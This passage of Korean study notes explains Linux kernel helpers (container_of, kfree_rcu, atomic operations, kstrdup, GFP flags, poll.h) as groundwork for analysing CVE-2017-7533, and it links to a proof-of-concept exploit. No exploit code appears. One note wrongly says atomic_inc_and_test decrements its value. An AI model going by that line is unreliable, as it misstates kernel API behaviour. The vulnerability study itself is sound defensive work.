    static inline int dname_external(const struct dentry *dentry)
    {
    	return dentry->d_name.name != dentry->d_iname;
    }

    static inline struct external_name *external_name(struct dentry *dentry)
    {
    	return container_of(dentry->d_name.name, struct external_name, name[0]);
    }

    #define offsetof(type, member) ((size_t) &((type *)0)->member)
    #define container_of(ptr, type, member) ({	\
    		const typeof( ((type *)0)->member ) *__mptr = (ptr);	\
    		(type *)( (char *)__mptr - offsetof(type,member) );})

    ptr : 멤버의 포인터
    type : 이 멤버를 포함하고 있는 컨테이너 structure의 타입
    member : type structure에 안에서 존재하는 멤버의 이름

    container_of : 구조체 멤버의 포인터를 이용하여 구조체의 시작 주소를 찾는 역할

    ```

    // kfree_rcu() - kfree an object after a grace period.


    #define __kfree_rcu(head, offset) \
    	do { \
    		BUILD_BUG_ON(!__is_kfree_rcu_offset(offset)); \
    		kfree_call_rcu(head, (rcu_callback_t)(unsigned long)(offset)); \
    	} while (0)

    #define kfree_rcu(ptr, rcu_head)					\
    	__kfree_rcu(&((ptr)->rcu_head), offsetof(typeof(*(ptr)), rcu_head))

    int atomic_dec_and_test (atomic_t *v);
    v : pointer of type atomic_t
    Description
    	Atomically decrements v by 1 and returns true if the result is 0, or false for all other cases.

    atomic_inc(&v)
     - v값을 읽 후 1 증가시키고 저장한다.
     	- *v++

    atomic_inc_and_test(&v)
     - v값을 읽은 후 1 감소시키고 저장한다. 또한 감소시킨 값이 0이면 true(1)를 반환하고, 그외의 값이면 false(0)를 반환한다.

    mm/util.c
    /////////////////////////////////////////////////////////////
     char *kstrdup(const char *s, gfp_t gfp)
    {
    	size_t len;
    	char *buf;
    	if (!s)
    		return NULL;
    	len = strlen(s) + 1;
    	buf = kmalloc_track_caller(len, gfp);
    	if (buf)
    		memcpy(buf, s, len);
    	return buf;
    }
    EXPORT_SYMBOL(kstrdup);

    kfree(old_name);

    GFP_ATOMIC : 메모리가 있으면 할당 없으면 NULL. 휴면 불가능
    GFP_KERNEL : 메모리 할당이 항상 성공하도록 요구, 메모리가 충분하지 않을 경우는 호출한 프로세스를 멈추고 동적 메모리 할당을 할 수 있는 상태가 될때까지 대기. 휴면가능.
    GFP_USER : 유저 메모리를 할당함. 휴면 가능
    GFP_DMA : 연속된 물리 메모리를 할당 받을 때 사용

    kstdup -- allocate space for and copy an existing string

    char * kstrdup (const char * s, gfp_t gfp);

    Arguments
    const char * s : the string to duplicate
    gfp_t gfp : the GFP mask used in the kmalloc call when allocating memory

    kstrdup(name, GFP_KERNEL);
{% endtab %}

{% tab title="" %}
{% code title="/include/uapi/asm-generic/poll.h" %}
```c
#ifndef __ASM_GENERIC_POLL_H
#define __ASM_GENERIC_POLL_H

/* These are specified by iBCS2 */
#define POLLIN		0x0001
#define POLLPRI		0x0002
#define POLLOUT		0x0004
#define POLLERR		0x0008
#define POLLHUP		0x0010
#define POLLNVAL	0x0020

/* The rest seem to be more-or-less nonstandard. Check them! */
#define POLLRDNORM	0x0040
#define POLLRDBAND	0x0080
#ifndef POLLWRNORM
#define POLLWRNORM	0x0100
#endif
#ifndef POLLWRBAND
#define POLLWRBAND	0x0200
#endif
#ifndef POLLMSG
#define POLLMSG		0x0400
#endif
#ifndef POLLREMOVE
#define POLLREMOVE	0x1000
#endif
#ifndef POLLRDHUP
#define POLLRDHUP       0x2000
#endif

#define POLLFREE	0x4000	/* currently only for epoll */

#define POLL_BUSY_LOOP	0x8000

struct pollfd {
	int fd;
	short events;
	short revents;
};

#endif	/* __ASM_GENERIC_POLL_H */
```
{% endcode %}
{% endtab %}
{% endtabs %}

## Reference

타겟 코드



[https://github.com/spotify/linux/blob/master/fs/notify/inotify/inotify\_fsnotify.c](https://github.com/spotify/linux/blob/master/fs/notify/inotify/inotify_fsnotify.c)

POC

[https://github.com/hardenedlinux/offensive\_poc/blob/master/CVE-2017-7533/exploit.c](https://github.com/hardenedlinux/offensive_poc/blob/master/CVE-2017-7533/exploit.c)

diff

[https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/diff/?id=49d31c2f389acfe83417083e1208422b4091cd9e](https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/diff/?id=49d31c2f389acfe83417083e1208422b4091cd9e)

그 도움됨

[https://seclists.org/oss-sec/2017/q3/240](https://seclists.org/oss-sec/2017/q3/240)

[https://avicom.tistory.com/entry/inotify](https://avicom.tistory.com/entry/inotify)

rmap 

[http://jake.dothome.co.kr/rmap-1/](http://jake.dothome.co.kr/rmap-1/)

